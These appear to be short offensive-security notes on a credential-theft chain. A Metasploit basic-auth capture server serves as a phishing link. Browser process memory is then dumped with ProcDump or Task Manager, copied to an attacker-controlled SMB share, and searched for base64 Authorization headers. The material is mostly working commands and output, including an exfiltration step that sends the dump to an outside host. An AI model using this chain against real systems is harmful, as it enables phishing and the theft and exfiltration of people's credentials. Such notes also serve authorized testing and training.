# Metasploit

## 01 - Use Case

### 1.1 - Phishing

```
msf6 > use auxiliary/server/capture/http_basic

msf6 auxiliary(server/capture/http_basic) > set srvhost 10.8.145.108
srvhost => 10.8.145.108
msf6 auxiliary(server/capture/http_basic) > set uripath /login
uripath => /login
msf6 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 3.
[*] Using URL: http://10.8.145.108/login
[*] Server started.
```

- Wait for the target to interact to the phishing link to pass the credentials.

![[01 - Realm.png]]

### 1.2 - Dump Credentials

#### 1.2.1 - Task Manager

- Create dump file

![[02 - Create Dump File.png]]

![[03 - Memory Dump File Saved.png]]

#### 1.2.2 - Sysinternal ProcDump

```
C:\Users\user> tasklist /svc

C:\Users\user> procdump.exe /accepteula -ma iexplore.exe C:\Users\user\AppData\Local\Temp\iexplore.dmp
```

### 1.3 - Exfiltrate Credentials

```
$ sudo smbserver.py share $(pwd)

C:\Users\user>copy C:\Users\user\AppData\Local\Temp\iexplore.dmp \\10.8.145.108\share\
The specified network name is no longer available.
        1 file(s) copied.

$ ls -lh
total 100M
-rw-r--r-- 1 user user 100M May 29 16:41 iexplore.dmp
```

### 1.4 - Extract Credentials

```
$ strings iexplore.DMP | grep "Authorization: Basic"

$ base64 -d <<< <base64_string>
```

---
## References

- [ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)